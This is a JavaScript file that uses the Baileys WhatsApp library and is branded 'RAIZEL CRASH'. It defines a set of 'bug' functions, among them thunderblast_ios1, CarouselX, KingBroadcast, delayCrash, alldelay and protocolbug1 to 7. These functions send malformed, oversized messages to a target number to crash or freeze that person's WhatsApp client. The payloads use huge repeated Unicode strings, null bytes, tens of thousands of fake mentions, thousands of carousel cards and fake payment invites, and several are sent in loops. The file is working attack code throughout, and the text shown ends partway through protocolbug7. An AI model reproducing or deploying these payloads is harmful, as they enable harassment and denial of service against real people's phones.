import { generateWAMessageFromContent, proto } from "@whiskeysockets/baileys";
import crypto from "crypto";

// ===================== HELPERS =====================
export const sleep = ms => new Promise(r => setTimeout(r, ms));

function generateEncryptedID(seed = "") {
  return crypto.createHash("sha256").update(seed + Date.now().toString() + Math.random().toString()).digest("hex").toUpperCase();
}

// Fallbacks pour éviter référence undefined (préserve les textes lourds intacts)
const DEFAULT_THUMB = "https://files.catbox.moe/aanan8.jpg";
const DEFAULT_IMG = "https://files.catbox.moe/4185go.jpg";
if (typeof global !== "undefined") {
  if (!global.thumb) global.thumb = DEFAULT_THUMB;
  if (!global.imgCrL) global.imgCrL = DEFAULT_IMG;
}

// ===================== Bug Functions =====================
// NOTE: Toutes les fonctions utilisent `sock` comme premier argument (instance Baileys)

// carousels2 (préserve le contenu lourd mais protège si prepareWAMessageMedia est absent)
async function carousels2(sock, target, fJids) {
  if (typeof prepareWAMessageMedia === "undefined") {
    console.warn("carousels2 skipped: prepareWAMessageMedia not defined.");
    return;
  }
  const cards = [];
  const media = await prepareWAMessageMedia(
    { image: global.imgCrL },
    { upload: sock.waUploadToServer }
  );

  const header = proto.Message.InteractiveMessage.Header.fromObject({
    imageMessage: media.imageMessage,
    title: '⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦',
    gifPlayback: false,
    subtitle: '⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞͞⃟⏤͟͟͞͞͠🩸✦',
    hasMediaAttachment: true
  });

  for (let r = 0; r < 1000; r++) {
    cards.push({
      header,
      body: { text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "view",
              url: "https://example.com"
            })
          }
        ]
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦" },
            footer: { text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦" },
            carouselMessage: { cards, messageVersion: 1 }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, fJids ? { participant: { jid: target, messageId: null } } : {});
  console.log("𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆🐉");
}

async function Loc(sock, target, amount, jids) {
  const pesan = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "",
            locationMessage: {},
            hasMediaAttachment: true
          },
          body: { text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦" },
          nativeFlowMessage: {
            buttons: Array(10).fill({
              name: "single_select",
              buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
            })
          }
        }
      },
      carouselMessage: { cards: [] }
    }
  }), { userJid: target, quoted: null });

  await sock.relayMessage(target, pesan.message, jids ? { participant: { jid: target } } : {});
  console.log("𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆🐉");
}

async function thunderblast_ios1(sock, target) {
  const TravaIphone = "𑇂𑆵𑆴𑆿".repeat(60000);
  const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
    groupMentionedMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/json",
              fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
              fileLength: "999999999999",
              pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
              mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
              fileName,
              fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
              directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1715880173"
            },
            hasMediaAttachment: true
          },
          body: { text: bodyText },
          nativeFlowMessage: {
            messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"🚀","flow_id":"UNDEFINEDONTOP","flow_message_version":"9.903","flow_token":"UNDEFINEDONTOP"}`
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINEDONTOP" }]
          }
        }
      }
    }
  }), { userJid: target });

  const msg1 = await genMsg(`${TravaIphone}️`, "𑇂𑆵𑆴𑆿".repeat(1000));
  await sock.relayMessage(target, msg1.message, { participant: { jid: target }, messageId: msg1.key?.id });

  const msg2 = await genMsg("UNDEFINEDONTOP", "\u0000" + "ꦾ".repeat(150000) + "@1".repeat(250000));
  await sock.relayMessage(target, msg2.message, { participant: { jid: target }, messageId: msg2.key?.id });

  await sock.relayMessage(target, {
    locationMessage: {
      degreesLatitude: 173.282,
      degreesLongitude: -19.378,
      name: TravaIphone,
      url: "https://youtube.com/@ShinZ.00"
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    'extendedTextMessage': {
      'text': TravaIphone,
      'contextInfo': {
        'stanzaId': target,
        'participant': target,
        'quotedMessage': { 'conversation': 'UNDEFINEDONTOP↕️' + 'ꦾ'.repeat(50000) },
        'disappearingMode': { 'initiator': "CHANGED_IN_CHAT", 'trigger': "CHAT_SETTING" }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, { 'participant': { 'jid': target } }, { 'messageId': null });

  const paymentMsg = service => ({
    paymentInviteMessage: {
      serviceType: service,
      expiryTimestamp: Date.now() + 91814400000,
      maxTransactionAmount: 10000000000,
      maxDailyTransaction: 100000000000,
      maxTransactionFrequency: 1,
      secureMode: true,
      verificationRequired: true,
      antiFraudProtection: true,
      multiFactorAuthentication: true,
      transactionLogging: true,
      geoLock: true,
      sessionTimeout: 300000,
      blacklistIPs: ["192.168.0.1", "192.168.0.2"],
      whitelistIPs: ["192.168.1.1", "192.168.1.2"],
      transactionRateLimit: 3,
      realTimeFraudDetection: true,
      dailyLimitResetTime: "00:00",
      fullAuditTrail: true,
      userBehaviorAnalysis: true,
      transactionNotification: true,
      dynamicSessionTokens: true,
      deviceFingerprinting: true,
      transactionEncryption: true,
      encryptedMsgID: generateEncryptedID(service)
    }
  });

  for (const service of ["FBPAY", "UPI", "PAYPAL", "WPPAY", "GPAY", "PP", "APPLEPAY", "VENMO", "CASHAPP", "STRIPE", "BRAINTREE", "SAMSUNGPAY", "ALIPAY", "WECHATPAY", "MPAY", "AIPAY", "BIOPAY", "NFTPAY", "VOICEPAY", "BLOCKPAY", "QPAY", "NPAY", "ZPAY", "TLOCK", "HOLO"]) {
    await sock.relayMessage(target, paymentMsg(service), {
      participant: { jid: target },
      timestamp: Date.now(),
      requestID: generateEncryptedID(service),
    });
  }

  await sock.relayMessage(target, {
    locationMessage: {
      degreesLatitude: 173.282,
      degreesLongitude: -19.378,
      name: "😘" + TravaIphone,
      url: "https://youtube.com/@ShinZ.00"
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    locationMessage: {
      degreesLatitude: 173.282,
      degreesLongitude: -19.378,
      name: "😘" + TravaIphone,
      url: "https://youtube.com/@qioaje"
    }
  }, { participant: { jid: target } });
}

async function callHome(sock, target, ptcp = true) {
  let conf = {};
  if (ptcp === true) {
    conf = { participant: { jid: target } };
  }
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: { hasMediaAttachment: false },
          body: { text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦" },
          nativeFlowMessage: {
            buttons: [
              { name: "cta_call", buttonParamsJson: JSON.stringify({ status: "𛀠" }) },
              { name: "call_permission_request", buttonParamsJson: "" }
            ],
            messageParamsJson: ""
          }
        }
      }
    }
  }, conf);
}

async function CarouselX(sock, target) {
  for (let i = 0; i < 1020; i++) {
    try {
      let push = [];
      for (let k = 0; k < 1020; k++) {
        push.push({
          body: proto.Message.InteractiveMessage.Body.fromObject({ text: "ㅤ" }),
          footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤㅤ" }),
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: '⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦',
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg"
            }
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
        });
      }

      const carousel = generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.create({ text: `${"𑜦".repeat(40000)}wkwkwkwkwkkwkwkwkwk2kwkwkwkkqkwkkwkwkwwkkwk\n\u0000` }),
                footer: proto.Message.InteractiveMessage.Footer.create({ text: "`YT:` https://youtube.com/@richieMods" }),
                header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: push })
              })
            }
          }
        },
        {}
      );

      await sock.relayMessage(target, carousel.message, { participant: { jid: target } });
    } catch (err) {
      console.error("Error in CarouselX:", err);
    }
  }
}

async function KingDelayMess(sock, target, Ptcp = true) {
  await sock.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.create({
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=", "base64"),
              fileLength: 9999999999999,
              pageCount: 1316134911,
              mediaKey: Buffer.from("45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=", "base64"),
              fileName: "kingbadboi.𝐜𝐨𝐦",
              fileEncSha256: Buffer.from("LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=", "base64"),
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: 1726867151,
              contactVcard: true
            },
            hasMediaAttachment: true
          },
          body: {
            text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦\n" + "@15056662003".repeat(1000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "Iqbhalkeifer",
                  url: "https://youtube.com/@iqbhalkeifer25",
                  merchant_url: "https://youtube.com/@iqbhalkeifer25"
                })
              },
              { name: "call_permission_request", buttonParamsJson: "{}" }
            ],
            messageParamsJson: "{}"
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from({ length: 50 }, () => `${Math.floor(Math.random() * 9000000000) + 1000000000}@s.whatsapp.net`)
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=", "base64"),
                fileLength: 9999999999999,
                pageCount: 1316134911,
                mediaKey: Buffer.from("lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=", "base64"),
                fileName: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
                fileEncSha256: Buffer.from("wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=", "base64"),
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: 1724474503,
                contactVcard: true
              }
            }
          }
        })
      }
    }
  }, Ptcp ? { participant: target } : {});
}

async function KingBroadcast(sock, target, mention = true) {
  const delaymention = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(95000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "-"
            }
          },
          description: "richie is him"
        }
      }
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2
    }
  };

  const msg = generateWAMessageFromContent(target, MSG, {});
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦" },
          content: undefined
        }
      ]
    });
  }
}

async function DelayInvisNew(sock, target) {
  const payload = {
    key: { remoteJid: target, fromMe: false, id: "Qw" },
    message: {
      extendedTextMessage: {
        text: "\u2060",
        matchedText: "\u2060",
        canonicalUrl: "https://t.me/DevRaizel",
        title: "𝐑𝐀𝐈𝐙𝐄𝐋",
        description: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
        jpegThumbnail: global.thumb || DEFAULT_THUMB,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            mediaType: 1,
            previewType: "DOCUMENT",
            title: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
            thumbnailUrl: global.thumb || DEFAULT_THUMB,
            sourceUrl: "https://t.me/DevRaizel"
          },
          forwardingScore: 999,
          isForwarded: true,
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Dimzxzzx",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
              mediaKeyTimestamp: 1726867151,
              contactVcard: true,
              jpegThumbnail: global.thumb || DEFAULT_THUMB
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, payload.message, { messageId: payload.key.id });
}

async function superdelayinvid(sock, target) {
  const payload = {
    key: { remoteJid: target, fromMe: false, id: "BAE538D8B0529FB7" },
    message: {
      extendedTextMessage: {
        text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
        contextInfo: {
          participant: "13135550002@s.whatsapp.net",
          quotedMessage: { extendedTextMessage: { text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦" } },
          remoteJid: "status@broadcast"
        }
      }
    },
    messageTimestamp: Math.floor(Date.now() / 1000),
    broadcast: true,
    pushName: "2709"
  };

  await sock.relayMessage(target, payload.message, { messageId: payload.key.id });
}

async function delayCrash(sock, target, mention = false, delayMs = 500) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "? ???????-?",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: { key: msg.key, type: 25 }
        }
      }
    }, {
      additionalNodes: [
        { tag: "meta", attrs: { is_status_mention: "???? ???????? - ????" }, content: undefined }
      ]
    });
  }

  await sleep(delayMs);
}

async function alldelay(sock, target) {
  const start = Date.now();

  for (let i = 0; i <= 900; i++) {
    await DelayInvisNew(sock, target);
    await superdelayinvid(sock, target);
    await delayCrash(sock, target, false);
    await KingBroadcast(sock, target, true);
    await DelayInvisNew(sock, target);
    await superdelayinvid(sock, target);
    await delayCrash(sock, target, false);
    await KingBroadcast(sock, target, true);
    await DelayInvisNew(sock, target);
    await superdelayinvid(sock, target);
    await delayCrash(sock, target, false);
    await KingBroadcast(sock, target, true);
    await KingDelayMess(sock, target, true);
  }

  const end = Date.now();
  const seconds = ((end - start) / 1000).toFixed(2);
  console.log(`✅ alldelay finished for: ${target} in ${seconds}s`);
}

async function apaya(sock, target) {
  try {
    const messsage = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: '33333333333333333@newsletter',
            newsletterName: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦" + "ꦾ".repeat(120000),
            jpegThumbnail: global.thumb,
            caption: "ꦽ".repeat(120000),
            inviteExpiration: Date.now() + 1814400000,
          }
        }
      }
    };
    await sock.relayMessage(target, messsage, { userJid: target });
  } catch (err) {
    console.log(err);
  }
}

async function bulldozer(sock, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
            ]
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, message, {});
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
}

// ===================== PROTOCOL BUGS =====================

async function protocolbug1(sock, target) {
  try {
    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/25360406_924338205970719_6258770868298789937_n.enc?ccb=11-4&oh=01_Q5AaIY6BODl_yAALuhVzH09Crc92wpoaG3fDPC8kHz6otgbN&oe=67B77EE5&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "e3jHWplEMKmgpR2yK1fTYgIvmUzfIirJd9kByoMvT9M=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "hz7nF0bMpb2ZnSyYGy4FAR9tQSTWQp4zHBMc9CGRWKg=",
                fileName: "🧿RAIZEL🧿",
                fileEncSha256: "Z1sOip61tq3O8F3N9LrF+rVFYF4j2tf1xOQnlD1whf0=",
                directPath: "/v/t62.7119-24/25360406_924338205970719_6258770868298789937_n.enc",
                mediaKeyTimestamp: 1725896321
              },
              hasMediaAttachment: true
            },
            body: { text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐏𝐑𝐎𝐓𝐎𝐂𝐎𝐋𝟏͞⃟⏤͟͟͞͞͠🩸✦" },
            nativeFlowMessage: {
              buttons: [
                { name: "cta_copy", buttonParamsJson: '{"copy_code":"RAIZEL"}' },
                { name: "cta_url", buttonParamsJson: '{"display_text":"JOIN","url":"https://t.me/DevRaizel"}' }
              ]
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, msg.message, { participant: { jid: target }, messageId: msg.key.id });
  } catch (err) {
    console.error("Erreur dans protocolbug1 :", err);
  }
}

async function protocolbug2(sock, target) {
  try {
    const payload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: { hasMediaAttachment: false },
            body: { text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐏𝐑𝐎𝐓𝐎𝐂𝐎𝐋𝟐͞⃟⏤͟͟͞͞͠🩸✦" },
            nativeFlowMessage: {
              buttons: Array(500).fill({
                name: "cta_url",
                buttonParamsJson: '{"display_text":"VORTEX","url":"https://t.me/DevRaizel"}'
              })
            }
          }
        }
      }
    };
    const msg = generateWAMessageFromContent(target, payload, {});
    await sock.relayMessage(target, msg.message, { participant: { jid: target } });
  } catch (err) {
    console.error("Erreur dans protocolbug2 :", err);
  }
}

async function protocolbug3(sock, target) {
  try {
    const massiveMention = Array.from({ length: 10000 }, () => "1" + Math.floor(Math.random() * 900000) + "@s.whatsapp.net");
    const payload = {
      extendedTextMessage: {
        text: "🔥 𝐑𝐀𝐈𝐙𝐄𝐋 𝐏𝐑𝐎𝐓𝐎𝐂𝐎𝐋 𝟑 🔥",
        contextInfo: { mentionedJid: massiveMention, forwardingScore: 999, isForwarded: true }
      }
    };
    await sock.relayMessage(target, payload, { participant: { jid: target } });
  } catch (err) {
    console.error("Erreur dans protocolbug3 :", err);
  }
}

async function protocolbug4(sock, target) {
  try {
    const data = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: { hasMediaAttachment: false },
            body: { text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋 𝐏𝐑𝐎𝐓𝐎𝐂𝐎𝐋 𝟒͞⃟🩸✦" },
            nativeFlowMessage: {
              buttons: [
                { name: "cta_copy", buttonParamsJson: '{"copy_code":"R4ZL"}' },
                { name: "cta_call", buttonParamsJson: '{"status":"ACTIVE"}' },
                { name: "cta_url", buttonParamsJson: '{"display_text":"SOURCE","url":"https://github.com/DevRaizel"}' }
              ]
            }
          }
        }
      }
    };
    const msg = generateWAMessageFromContent(target, data, {});
    await sock.relayMessage(target, msg.message, { participant: { jid: target } });
  } catch (err) {
    console.error("Erreur dans protocolbug4 :", err);
  }
}

async function protocolbug5(sock, target) {
  try {
    for (let i = 0; i < 10; i++) {
      const payload = {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: { hasMediaAttachment: true, title: "RAIZEL DELAY PROTOCOL 5" },
              body: { text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋𝟓꙳𝐂𝐑𝐀𝐒𝐇͞⃟🩸✦" },
              nativeFlowMessage: { buttons: Array(50).fill({ name: "cta_copy", buttonParamsJson: '{"copy_code":"RAIZEL5"}' }) }
            }
          }
        }
      };
      const msg = generateWAMessageFromContent(target, payload, {});
      await sock.relayMessage(target, msg.message, { participant: { jid: target } });
      await sleep(300);
    }
  } catch (err) {
    console.error("Erreur dans protocolbug5 :", err);
  }
}

async function protocolbug6(sock, target, ptcp = true) {
  try {
    const payload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: { hasMediaAttachment: false },
            body: { text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋 𝐏𝐑𝐎𝐓𝐎𝐂𝐎𝐋 𝟔͞⃟🩸✦" },
            nativeFlowMessage: { buttons: Array(300).fill({ name: "cta_url", buttonParamsJson: '{"display_text":"PROTOCOL6","url":"https://t.me/DevRaizel"}' }) }
          }
        }
      }
    };
    const msg = generateWAMessageFromContent(target, payload, {});
    await sock.relayMessage(target, msg.message, ptcp ? { participant: { jid: target } } : {});
  } catch (err) {
    console.error("Erreur dans protocolbug6 :", err);
  }
}

async function protocolbug7(sock, target) {
  try {
    const hugeBody = "꧁༒𝐑𝐀𝐈𝐙𝐄𝐋༒꧂".repeat(3000);
    const payload = {
      viewOnceMessage: {
